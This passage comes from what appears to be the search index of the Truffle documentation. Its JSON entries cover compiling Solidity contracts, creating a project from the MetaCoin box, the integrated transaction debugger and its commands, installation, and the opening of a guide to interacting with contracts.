};","title":"Configuration"},{"location":"docs/truffle/distributed-ledger-support/working-with-quorum.html#using-privacy-features","text":"Privacy features have been restored in Truffle 5.0.14 . They are also available in v4 . Please refer to the Quorum tutorial to learn more about how to use the privacy features within Quorum. Here are some quick references for privacy within the tutorial: - Deploying contracts privately - Making transactions private - Interacting with your contracts privately .","title":"Using Privacy Features"},{"location":"docs/truffle/getting-started/compiling-contracts.html","text":"Compiling contracts \u00b6 Location \u00b6 All of your contracts are located in your project's contracts/ directory. As contracts are written in Solidity , all files containing contracts will have a file extension of .sol . Associated Solidity libraries will also have a .sol extension. With a bare Truffle project (created through truffle init ), you're given a single Migrations.sol file that helps in the deployment process. If you're using a Truffle Box , you will have multiple files here. Command \u00b6 To compile a Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option. Build artifacts \u00b6 Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) The name of the generated artifact .json files do not reflect the name of the source file but of the name of the contract definition . This means that changing the contract name string in the artifacts.require method to match that of the source file may lead to a Error: Could not find artifacts for {yourContract} from any sources if the contained smart contract definition is named differently. These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment. Dependencies \u00b6 You can declare contract dependencies using Solidity's import command. Truffle will compile contracts in the correct order and ensure all dependencies are sent to the compiler. Dependencies can be specified in two ways: Importing dependencies via file name \u00b6 To import contracts from a separate file, add the following code to your Solidity source file: import \"./AnotherContract.sol\" ; This will make all contracts within AnotherContract.sol available. Here, AnotherContract.sol is relative to the path of the current contract being written. Note that Solidity allows other import syntaxes as well. See the Solidity import documentation for more information. Importing contracts from an external package \u00b6 Truffle supports dependencies installed via both EthPM and NPM . To import contracts from a dependency, use the following syntax import \"somepackage/SomeContract.sol\" ; Here, somepackage represents a package installed via EthPM or NPM, and SomeContract.sol represents a Solidity source file provided by that package. Note that Truffle will search installed packages from EthPM first before searching for packages installed from NPM, so in the rare case of a naming conflict the package installed via EthPM will be used. For more information on how to use Truffle's package management features, please see the Truffle EthPM and NPM documentation.","title":"Compiling Contracts"},{"location":"docs/truffle/getting-started/compiling-contracts.html#compiling-contracts","text":"","title":"Compiling contracts"},{"location":"docs/truffle/getting-started/compiling-contracts.html#location","text":"All of your contracts are located in your project's contracts/ directory. As contracts are written in Solidity , all files containing contracts will have a file extension of .sol . Associated Solidity libraries will also have a .sol extension. With a bare Truffle project (created through truffle init ), you're given a single Migrations.sol file that helps in the deployment process. If you're using a Truffle Box , you will have multiple files here.","title":"Location"},{"location":"docs/truffle/getting-started/compiling-contracts.html#command","text":"To compile a Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option.","title":"Command"},{"location":"docs/truffle/getting-started/compiling-contracts.html#build-artifacts","text":"Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) The name of the generated artifact .json files do not reflect the name of the source file but of the name of the contract definition . This means that changing the contract name string in the artifacts.require method to match that of the source file may lead to a Error: Could not find artifacts for {yourContract} from any sources if the contained smart contract definition is named differently. These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment.","title":"Build artifacts"},{"location":"docs/truffle/getting-started/compiling-contracts.html#dependencies","text":"You can declare contract dependencies using Solidity's import command. Truffle will compile contracts in the correct order and ensure all dependencies are sent to the compiler. Dependencies can be specified in two ways:","title":"Dependencies"},{"location":"docs/truffle/getting-started/compiling-contracts.html#importing-dependencies-via-file-name","text":"To import contracts from a separate file, add the following code to your Solidity source file: import \"./AnotherContract.sol\" ; This will make all contracts within AnotherContract.sol available. Here, AnotherContract.sol is relative to the path of the current contract being written. Note that Solidity allows other import syntaxes as well. See the Solidity import documentation for more information.","title":"Importing dependencies via file name"},{"location":"docs/truffle/getting-started/compiling-contracts.html#importing-contracts-from-an-external-package","text":"Truffle supports dependencies installed via both EthPM and NPM . To import contracts from a dependency, use the following syntax import \"somepackage/SomeContract.sol\" ; Here, somepackage represents a package installed via EthPM or NPM, and SomeContract.sol represents a Solidity source file provided by that package. Note that Truffle will search installed packages from EthPM first before searching for packages installed from NPM, so in the rare case of a naming conflict the package installed via EthPM will be used. For more information on how to use Truffle's package management features, please see the Truffle EthPM and NPM documentation.","title":"Importing contracts from an external package"},{"location":"docs/truffle/getting-started/creating-a-project.html","text":"Creating a Project \u00b6 To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project template, but for those just getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts: Create a new directory for your Truffle project: mkdir MetaCoin cd MetaCoin Download (\"unbox\") the MetaCoin box: truffle unbox metacoin Note : You can use the truffle unbox <box-name> command to download any of the other Truffle Boxes . Note : To create a bare Truffle project with no smart contracts included, use truffle init . Note : You can use an optional --force to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file","title":"Creating a Project"},{"location":"docs/truffle/getting-started/creating-a-project.html#creating-a-project","text":"To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project. You can create a bare project template, but for those just getting started, you can use Truffle Boxes , which are example applications and project templates. We'll use the MetaCoin box , which creates a token that can be transferred between accounts: Create a new directory for your Truffle project: mkdir MetaCoin cd MetaCoin Download (\"unbox\") the MetaCoin box: truffle unbox metacoin Note : You can use the truffle unbox <box-name> command to download any of the other Truffle Boxes . Note : To create a bare Truffle project with no smart contracts included, use truffle init . Note : You can use an optional --force to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for Solidity contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file","title":"Creating a Project"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html","text":"Debugging Your Contracts \u00b6 Truffle includes an integrated debugger so that you can debug transactions made against your contracts. This debugger looks and feels like existing command line debuggers available for traditional development environments. Overview \u00b6 New in Truffle v5.1: truffle test --debug . Set breakpoints in your JavaScript tests with the new debug() global! See below . New in Truffle v5.1.29: truffle debug --fetch-external . Debug transactions involving contracts not in your project that are verified on Etherscan ! (And as of v5.1.32, it works with Sourcify too!) See below . Debugging a transaction on the blockchain is different than debugging traditional applications (for instance, applications written in C++ or Javascript). When debugging a transaction on the blockchain, you're not running the code in real-time; instead, you're stepping over the historical execution of that transaction, and mapping that execution onto its associated code. This gives us many liberties in debugging, in that we can debug any transaction, any time, so long as we have the code and artifacts for the contracts the transaction interacted with. Think of these code and artifacts as akin to the debugging symbols needed by traditional debuggers. In order to debug transactions, you'll need the following: Truffle 4.0 or above. The hash of a transaction on your desired blockchain. (If you are using the built-in blockchain and trying to debug a test execution, you may obtain the hash by running truffle develop --log .) The source code and artifacts the transaction encounters. Note that it's okay if your desired transaction resulted in an exception or if it ran out of gas. The transaction still exists on chain, and so you can still debug it! Warning: Debugging a transaction against a contract that was compiled with optimization enabled may not work reliably. In-test debugging \u00b6 Truffle v5.1 and above provides the truffle test --debug flag and associated debug() global function, allowing you to interrupt tests to debug specific operations. Instead of capturing the transaction hash as described below, simply wrap any contract operation with debug() , like so: it ( \"should succeed\" , async function () { // wrap what you want to debug with `debug()`: await debug ( myContract . myFunction ( accounts [ 1 ], { from : accounts [ 0 ] }) ); // ^^^^^^^^^^^^^^^^^^ wrap contract operation ^^^^^^^^^^^^^^ }); Then, run truffle test --debug . Truffle will compile your sources and run your tests as normal until reaching the operation in question. At this point, Truffle will interrupt the normal test flow and start the debugger, allowing you to set breakpoints, inspect Solidity variables, etc. See Writing tests in JavaScript for more information on truffle test , and see Interacting with your contracts to learn about contract operations. Note : This feature currently doesn't work with reverted transactions; until we fix this, you can debug those with direct use of truffle debug . Debugging read-only calls \u00b6 Running the debugger from inside your JS tests allow additional functionality beyond which truffle debug <txHash> can provide. Beyond just debugging transactions, in-test debugging allows you to debug read-only calls as well. it ( \"should get latest result\" , async function () { // wrap what you want to debug with `debug()`: const result = await debug ( myContract . getResult ( \"latest\" ) ); // ^^^^^ read-only function ^^^^^ }); Command \u00b6 To use the debugger, gather the transaction you'd like to debug then run the following: $ truffle debug <transaction hash> Using a transaction starting with 0x8e5dadfb921dd... as an example, the command would look as follows: $ truffle debug 0x8e5dadfb921ddddfa8f53af1f9bd8beeac6838d52d7e0c2fe5085b42a4f3ca76 This will launch the debugging interface described below. If you simply want to open the debugger to get it ready, so that you can debug a transaction later, you can also simply run: $ truffle debug Regardless of how you start the debugger, once it is running you are not limited to debugging only the transaction you launched it with; it is possible to unload the current transaction and load a new one, as described below. You can specify the network you want to debug on with the --network option: $ truffle debug [ <transaction hash> ] --network <network> And if you want to debug your Solidity test contracts , you can pass the --compile-tests option: $ truffle debug [ <transaction hash> ] --compile-tests And with the --fetch-external option ( see below ), you can debug contract instances outside your project that have verified source code on Etherscan or Sourcify . When using this option, you must specify a transaction hash to debug, and you will not be able to switch transactions from inside the debugger. $ truffle debug <transaction hash> --fetch-external --network <network> Faster debugger startup: If your project was not compiled all at once (or under certain other conditions), the debugger will have to do its own compile of your project on startup. This can be very slow. If you compile your whole project at once, however, the debugger can likely avoid the initial recompile, speeding up startup greatly. Debugging external contracts with verified source \u00b6 If you pass the --fetch-external option, the debugger will attempt to download verified source code off of Etherscan and Sourcify for any addresses involved in the transaction that it cannot find source code for in your project. You can of course debug such transactions without this option, but when stepping through the transaction the external calls to these unrecognized contracts will simply be skipped over. This option can also be abbreviated -x . If you have an Etherscan API key, you can include it in your configuration file and the debugger will use it when downloading source from Etherscan. Including this can speed up downloads. Example: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one } } Debugging interface \u00b6 Starting the debugger will open an interface familiar to those that have debugged other types of applications. When it starts, you'll see the following: A list of addresses either transacted against or created during the course of this transaction. A list of available commands for using the debugger. And the initial entry point for the transaction, including contract source file and code preview. The enter key is set to perform the last command entered. When the debugger starts, the enter key is set to step to the next logical source code element encountered during execution (i.e., the next expression or statement evaluated by the Ethereum virtual machine). At this point you can press enter to step through the transaction, or enter one of the available commands to analyze the transaction in more detail. The list of commands is detailed below. (o) step over \u00b6 This command steps over the current line, relative to the position of the statement or expression currently being evaluated in the Solidity source file. Use this command if you don't want to step into a function call or contract creation on the current line, or if you'd like to quickly jump to a specific point in the source file. (i) step into \u00b6 This command steps into the function call or contract creation currently being evaluated. Use this command to jump into the function and quickly start debugging the code that exists there. (u) step out \u00b6 This command steps out of the currently running function. Use this command to quickly get back to the calling function, or end execution of the transaction if this was the entry point of the transaction. (n) step next \u00b6 This command steps to the next logical statement or expression in the source code. For example, evaluating sub expressions will need to occur first before the virtual machine can evaluate the full expression. Use this command if you'd like to analyze each logical item the virtual machine evaluates. (;) step instruction \u00b6 This command allows you to step through each individual instruction evaluated by the virtual machine. This is useful if you're interested in understanding the low level bytecode created by the Solidity source code. When you use this command, the debugger will also print out the stack data at the time the instruction was evaluated. (If additional data displays have been turned on with the p command, those will be shown too.) You can also use this command with a numerical argument, to step that many times. (p) print instruction \u00b6 This commands prints the current instruction and stack data, but does not step to the next instruction. Use this when you'd like to see the current instruction and stack data after navigating through the transaction with the logical commands described above. This command can also print locations other than the stack, if you want to view memory, storage, or calldata. Simply type p memory to show memory along with the other information, p storage for storage, or p calldata for calldata. Each of these can also be abbreviated, e.g. p mem ; they can also be combined, e.g. p mem sto . You can also add these extra locations to the default display with + ; e.g., p +mem will make it so that memory will always be displayed when you enter p or ; , and p -mem will turn this off. You can even turn off the stack display with p -sta , or force it to display with p sta . All of these options can again be combined. (g) turn on generated sources \u00b6 When using Solidity 0.7.2 or later, you can use this option to allow the debugger to step into the internal assembly routines that Solidity generates. You can always advance into these with the ; command, but this option allows the other debugger commands ( n , i , o , u ) to step into these routines as well. (G) turn off generated sources \u00b6 This command undoes the g command, returning the debugger to its default behavior with regard to generated sources. Note that when generated sources are turned off, you can still advance into them with the ; command; and if a breakpoint is placed in one, continuing with c will still stop on such breakpoints. In addition, once inside such a routine, the other debugger commands ( n , i , o , u ) will advance as normal inside of it; they won't immediately exit it. (h) print this help \u00b6 Print the list of available commands. (q) quit \u00b6 Quit the debugger. (r) reset \u00b6 Reset the debugger to the beginning of the transaction. (b) set a breakpoint \u00b6 This command allows you to set breakpoints for any line in any of your source files (see examples below). These can be given by line number; by relative line number; by line number in a specified source file; or one may simply add a breakpoint at the current point in the code. You don't need a transaction loaded to set breakpoints, although in that case you will have to specify which source file you mean to set it in. (B) remove a breakpoint \u00b6 This command allows you to remove any of your existing breakpoints, with the same syntax as for adding them (see example below). Type B all to remove all breakpoints. (c) continue until breakpoint \u00b6 This command will cause execution of the code to continue until the next breakpoint is reached or the last line is executed. (:) evaluate and print expression \u00b6 This command will evaluate and print the given expression, based on the current variables and their values (see also v ). (+) add watch expression \u00b6 This command will add a watch on a provided expression, based on the following syntax: +:<expression> . (-) remove watch expression \u00b6 This command will remove a watch expression, based on the following syntax: -:<expression> . (?) list existing watch expressions and breakpoints \u00b6 This command will display a list of all the current watch expressions and breakpoints. It will also report whether generated sources are turned on or off. (v) display variables \u00b6 This command will display the current variables and their values. (T) unload transaction \u00b6 This command unloads the current transaction so you can load a new one. Not usable in --fetch-external mode. (t) load transaction \u00b6 This command loads a new transaction (given by its transaction hash). Note that if you already have a transaction loaded, you must first explicitly unload it before you can load a new one. Not usable in --fetch-external mode. Adding and removing breakpoints \u00b6 Below are some examples of adding and removing breakpoints. Note the difference in case between adding (a lowercase 'b') and removing (an uppercase 'B'). If you add a breakpoint at a place where the debugger will skip over, it will be automatically moved down to the next point that the debugger might stop. This does not apply to removing breakpoints. Use the ? command to list current breakpoints. MagicSquare.sol: 11: event Generated(uint n); 12: 13: function generateMagicSquare(uint n) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug(develop:0x91c817a1...)> b 23 Breakpoint added at line 23. debug(develop:0x91c817a1...)> B 23 Breakpoint removed at line 23. debug(develop:0x91c817a1...)> b SquareLib:5 Breakpoint added at line 5 in SquareLib.sol. debug(develop:0x91c817a1...)> b +10 Breakpoint added at line 23. debug(develop:0x91c817a1...)> b Breakpoint added at this point in line 13. debug(develop:0x91c817a1...)> B all Removed all breakpoints.","title":"Debugging Your Contracts"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#debugging-your-contracts","text":"Truffle includes an integrated debugger so that you can debug transactions made against your contracts. This debugger looks and feels like existing command line debuggers available for traditional development environments.","title":"Debugging Your Contracts"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#overview","text":"New in Truffle v5.1: truffle test --debug . Set breakpoints in your JavaScript tests with the new debug() global! See below . New in Truffle v5.1.29: truffle debug --fetch-external . Debug transactions involving contracts not in your project that are verified on Etherscan ! (And as of v5.1.32, it works with Sourcify too!) See below . Debugging a transaction on the blockchain is different than debugging traditional applications (for instance, applications written in C++ or Javascript). When debugging a transaction on the blockchain, you're not running the code in real-time; instead, you're stepping over the historical execution of that transaction, and mapping that execution onto its associated code. This gives us many liberties in debugging, in that we can debug any transaction, any time, so long as we have the code and artifacts for the contracts the transaction interacted with. Think of these code and artifacts as akin to the debugging symbols needed by traditional debuggers. In order to debug transactions, you'll need the following: Truffle 4.0 or above. The hash of a transaction on your desired blockchain. (If you are using the built-in blockchain and trying to debug a test execution, you may obtain the hash by running truffle develop --log .) The source code and artifacts the transaction encounters. Note that it's okay if your desired transaction resulted in an exception or if it ran out of gas. The transaction still exists on chain, and so you can still debug it! Warning: Debugging a transaction against a contract that was compiled with optimization enabled may not work reliably.","title":"Overview"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#in-test-debugging","text":"Truffle v5.1 and above provides the truffle test --debug flag and associated debug() global function, allowing you to interrupt tests to debug specific operations. Instead of capturing the transaction hash as described below, simply wrap any contract operation with debug() , like so: it ( \"should succeed\" , async function () { // wrap what you want to debug with `debug()`: await debug ( myContract . myFunction ( accounts [ 1 ], { from : accounts [ 0 ] }) ); // ^^^^^^^^^^^^^^^^^^ wrap contract operation ^^^^^^^^^^^^^^ }); Then, run truffle test --debug . Truffle will compile your sources and run your tests as normal until reaching the operation in question. At this point, Truffle will interrupt the normal test flow and start the debugger, allowing you to set breakpoints, inspect Solidity variables, etc. See Writing tests in JavaScript for more information on truffle test , and see Interacting with your contracts to learn about contract operations. Note : This feature currently doesn't work with reverted transactions; until we fix this, you can debug those with direct use of truffle debug .","title":"In-test debugging"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#debugging-read-only-calls","text":"Running the debugger from inside your JS tests allow additional functionality beyond which truffle debug <txHash> can provide. Beyond just debugging transactions, in-test debugging allows you to debug read-only calls as well. it ( \"should get latest result\" , async function () { // wrap what you want to debug with `debug()`: const result = await debug ( myContract . getResult ( \"latest\" ) ); // ^^^^^ read-only function ^^^^^ });","title":"Debugging read-only calls"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#command","text":"To use the debugger, gather the transaction you'd like to debug then run the following: $ truffle debug <transaction hash> Using a transaction starting with 0x8e5dadfb921dd... as an example, the command would look as follows: $ truffle debug 0x8e5dadfb921ddddfa8f53af1f9bd8beeac6838d52d7e0c2fe5085b42a4f3ca76 This will launch the debugging interface described below. If you simply want to open the debugger to get it ready, so that you can debug a transaction later, you can also simply run: $ truffle debug Regardless of how you start the debugger, once it is running you are not limited to debugging only the transaction you launched it with; it is possible to unload the current transaction and load a new one, as described below. You can specify the network you want to debug on with the --network option: $ truffle debug [ <transaction hash> ] --network <network> And if you want to debug your Solidity test contracts , you can pass the --compile-tests option: $ truffle debug [ <transaction hash> ] --compile-tests And with the --fetch-external option ( see below ), you can debug contract instances outside your project that have verified source code on Etherscan or Sourcify . When using this option, you must specify a transaction hash to debug, and you will not be able to switch transactions from inside the debugger. $ truffle debug <transaction hash> --fetch-external --network <network> Faster debugger startup: If your project was not compiled all at once (or under certain other conditions), the debugger will have to do its own compile of your project on startup. This can be very slow. If you compile your whole project at once, however, the debugger can likely avoid the initial recompile, speeding up startup greatly.","title":"Command"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#debugging-external-contracts-with-verified-source","text":"If you pass the --fetch-external option, the debugger will attempt to download verified source code off of Etherscan and Sourcify for any addresses involved in the transaction that it cannot find source code for in your project. You can of course debug such transactions without this option, but when stepping through the transaction the external calls to these unrecognized contracts will simply be skipped over. This option can also be abbreviated -x . If you have an Etherscan API key, you can include it in your configuration file and the debugger will use it when downloading source from Etherscan. Including this can speed up downloads. Example: module . exports = { /* ... rest of truffle-config.js ... */ etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one } }","title":"Debugging external contracts with verified source"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#debugging-interface","text":"Starting the debugger will open an interface familiar to those that have debugged other types of applications. When it starts, you'll see the following: A list of addresses either transacted against or created during the course of this transaction. A list of available commands for using the debugger. And the initial entry point for the transaction, including contract source file and code preview. The enter key is set to perform the last command entered. When the debugger starts, the enter key is set to step to the next logical source code element encountered during execution (i.e., the next expression or statement evaluated by the Ethereum virtual machine). At this point you can press enter to step through the transaction, or enter one of the available commands to analyze the transaction in more detail. The list of commands is detailed below.","title":"Debugging interface"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#o-step-over","text":"This command steps over the current line, relative to the position of the statement or expression currently being evaluated in the Solidity source file. Use this command if you don't want to step into a function call or contract creation on the current line, or if you'd like to quickly jump to a specific point in the source file.","title":"(o) step over"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#i-step-into","text":"This command steps into the function call or contract creation currently being evaluated. Use this command to jump into the function and quickly start debugging the code that exists there.","title":"(i) step into"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#u-step-out","text":"This command steps out of the currently running function. Use this command to quickly get back to the calling function, or end execution of the transaction if this was the entry point of the transaction.","title":"(u) step out"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#n-step-next","text":"This command steps to the next logical statement or expression in the source code. For example, evaluating sub expressions will need to occur first before the virtual machine can evaluate the full expression. Use this command if you'd like to analyze each logical item the virtual machine evaluates.","title":"(n) step next"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#step-instruction","text":"This command allows you to step through each individual instruction evaluated by the virtual machine. This is useful if you're interested in understanding the low level bytecode created by the Solidity source code. When you use this command, the debugger will also print out the stack data at the time the instruction was evaluated. (If additional data displays have been turned on with the p command, those will be shown too.) You can also use this command with a numerical argument, to step that many times.","title":"(;) step instruction"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#p-print-instruction","text":"This commands prints the current instruction and stack data, but does not step to the next instruction. Use this when you'd like to see the current instruction and stack data after navigating through the transaction with the logical commands described above. This command can also print locations other than the stack, if you want to view memory, storage, or calldata. Simply type p memory to show memory along with the other information, p storage for storage, or p calldata for calldata. Each of these can also be abbreviated, e.g. p mem ; they can also be combined, e.g. p mem sto . You can also add these extra locations to the default display with + ; e.g., p +mem will make it so that memory will always be displayed when you enter p or ; , and p -mem will turn this off. You can even turn off the stack display with p -sta , or force it to display with p sta . All of these options can again be combined.","title":"(p) print instruction"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#g-turn-on-generated-sources","text":"When using Solidity 0.7.2 or later, you can use this option to allow the debugger to step into the internal assembly routines that Solidity generates. You can always advance into these with the ; command, but this option allows the other debugger commands ( n , i , o , u ) to step into these routines as well.","title":"(g) turn on generated sources"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#g-turn-off-generated-sources","text":"This command undoes the g command, returning the debugger to its default behavior with regard to generated sources. Note that when generated sources are turned off, you can still advance into them with the ; command; and if a breakpoint is placed in one, continuing with c will still stop on such breakpoints. In addition, once inside such a routine, the other debugger commands ( n , i , o , u ) will advance as normal inside of it; they won't immediately exit it.","title":"(G) turn off generated sources"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#h-print-this-help","text":"Print the list of available commands.","title":"(h) print this help"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#q-quit","text":"Quit the debugger.","title":"(q) quit"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#r-reset","text":"Reset the debugger to the beginning of the transaction.","title":"(r) reset"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#b-set-a-breakpoint","text":"This command allows you to set breakpoints for any line in any of your source files (see examples below). These can be given by line number; by relative line number; by line number in a specified source file; or one may simply add a breakpoint at the current point in the code. You don't need a transaction loaded to set breakpoints, although in that case you will have to specify which source file you mean to set it in.","title":"(b) set a breakpoint"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#b-remove-a-breakpoint","text":"This command allows you to remove any of your existing breakpoints, with the same syntax as for adding them (see example below). Type B all to remove all breakpoints.","title":"(B) remove a breakpoint"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#c-continue-until-breakpoint","text":"This command will cause execution of the code to continue until the next breakpoint is reached or the last line is executed.","title":"(c) continue until breakpoint"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#evaluate-and-print-expression","text":"This command will evaluate and print the given expression, based on the current variables and their values (see also v ).","title":"(:) evaluate and print expression"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#add-watch-expression","text":"This command will add a watch on a provided expression, based on the following syntax: +:<expression> .","title":"(+) add watch expression"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#-remove-watch-expression","text":"This command will remove a watch expression, based on the following syntax: -:<expression> .","title":"(-) remove watch expression"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#list-existing-watch-expressions-and-breakpoints","text":"This command will display a list of all the current watch expressions and breakpoints. It will also report whether generated sources are turned on or off.","title":"(?) list existing watch expressions and breakpoints"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#v-display-variables","text":"This command will display the current variables and their values.","title":"(v) display variables"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#t-unload-transaction","text":"This command unloads the current transaction so you can load a new one. Not usable in --fetch-external mode.","title":"(T) unload transaction"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#t-load-transaction","text":"This command loads a new transaction (given by its transaction hash). Note that if you already have a transaction loaded, you must first explicitly unload it before you can load a new one. Not usable in --fetch-external mode.","title":"(t) load transaction"},{"location":"docs/truffle/getting-started/debugging-your-contracts.html#adding-and-removing-breakpoints","text":"Below are some examples of adding and removing breakpoints. Note the difference in case between adding (a lowercase 'b') and removing (an uppercase 'B'). If you add a breakpoint at a place where the debugger will skip over, it will be automatically moved down to the next point that the debugger might stop. This does not apply to removing breakpoints. Use the ? command to list current breakpoints. MagicSquare.sol: 11: event Generated(uint n); 12: 13: function generateMagicSquare(uint n) ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug(develop:0x91c817a1...)> b 23 Breakpoint added at line 23. debug(develop:0x91c817a1...)> B 23 Breakpoint removed at line 23. debug(develop:0x91c817a1...)> b SquareLib:5 Breakpoint added at line 5 in SquareLib.sol. debug(develop:0x91c817a1...)> b +10 Breakpoint added at line 23. debug(develop:0x91c817a1...)> b Breakpoint added at this point in line 13. debug(develop:0x91c817a1...)> B all Removed all breakpoints.","title":"Adding and removing breakpoints"},{"location":"docs/truffle/getting-started/installation.html","text":"Installation \u00b6 npm install -g truffle Requirements \u00b6 NodeJS v8.9.4 or later Windows, Linux or Mac OS X Truffle also requires that you have a running Ethereum client which supports the standard JSON RPC API (which is nearly all of them). There are many to choose from, and some better than others for development. We'll discuss them in detail in the Choosing an Ethereum client section. Recommendations for Windows \u00b6 If you're running Truffle on Windows, you may encounter some naming conflicts that could prevent Truffle from executing properly. Please see the section on resolving naming conflicts for solutions.","title":"Installation"},{"location":"docs/truffle/getting-started/installation.html#installation","text":"npm install -g truffle","title":"Installation"},{"location":"docs/truffle/getting-started/installation.html#requirements","text":"NodeJS v8.9.4 or later Windows, Linux or Mac OS X Truffle also requires that you have a running Ethereum client which supports the standard JSON RPC API (which is nearly all of them). There are many to choose from, and some better than others for development. We'll discuss them in detail in the Choosing an Ethereum client section.","title":"Requirements"},{"location":"docs/truffle/getting-started/installation.html#recommendations-for-windows","text":"If you're running Truffle on Windows, you may encounter some naming conflicts that could prevent Truffle from executing properly. Please see the section on resolving naming conflicts for solutions.","title":"Recommendations for Windows"},{"location":"docs/truffle/getting-started/interacting-with-your-contracts.html","text":"Interacting with your contracts \u00b6 Introduction \u00b6 If you were writing raw requests to the Ethereum network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze. Reading and writing data \u00b6 The Ethereum network makes a distinction between writing data to the network and reading data from it, and this distinction plays a significant part in how you write your application. In general, writing data is called a transaction whereas reading data is called a call . Transactions and calls are treated very differently, and have the following characteristics. Transactions \u00b6 Transactions fundamentally change the state of the network. A transaction can be as simple as sending Ether to another account, or as complicated as executing a contract function or adding a new contract to the network. The defining characteristic of a transaction is that it writes (or changes) data. Transactions cost Ether to run, known as \"gas\", and transactions take time to process. When you execute a contract's function via a transaction, you cannot receive that function's return value because the transaction isn't processed immediately. In general, functions meant to be executed via a transaction will not return a value; they will return a transaction id instead. So in summary, transactions: Cost gas (Ether) Change the state of the network Aren't processed immediately Won't expose a return value (only a transaction id). Calls \u00b6 Calls, on the other hand, are very different. Calls can be used to execute code on the network, though no data will be permanently changed. Calls are free to run, and their defining characteristic is that they read data. When you execute a contract function via a call you will receive the return value immediately. In summary, calls: Are free (do not cost gas) Do not change the state of the network Are processed immediately Will expose a return value (hooray!) Choosing between a transaction and a call is as simple as deciding whether you want to read data, or write it. Introducing abstractions \u00b6 Contract abstractions are the bread and butter of interacting with Ethereum contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the MetaCoin contract available to you through Truffle Boxes via truffle unbox metacoin . pragma solidity >= 0.4.25 < 0.6.0 ; import \"./ConvertLib.sol\" ; // This is just a simple example of a coin-like contract. // It is not standards compatible and cannot be expected to talk to other // coin/token contracts. If you want to create a standards-compliant // token, see: https://github.com/ConsenSys/Tokens. Cheers! contract MetaCoin { mapping ( address => uint ) balances ; event Transfer ( address indexed _from , address indexed _to , uint256 _value ); constructor () public { balances [ tx.origin ] = 10000 ; } function sendCoin ( address receiver , uint amount ) public returns ( bool sufficient ) { if ( balances [ msg.sender ] < amount ) return false ; balances [ msg.sender ] -= amount ; balances [ receiver ] += amount ; emit Transfer ( msg.sender , receiver , amount ); return true ; } function getBalanceInEth ( address addr ) public view returns ( uint ){ return ConvertLib . convert ( getBalance ( addr ), 2 ); } function getBalance ( address addr ) public view returns ( uint ) { return balances [ addr ]; } } This contract has three methods aside from the constructor ( sendCoin , getBalanceInEth , and getBalance ). All three methods can be executed as either a transaction or a call. Now let's look at the Javascript object called MetaCoin provided for us by Truffle, as made available in the Truffle console : truffle ( develop ) > 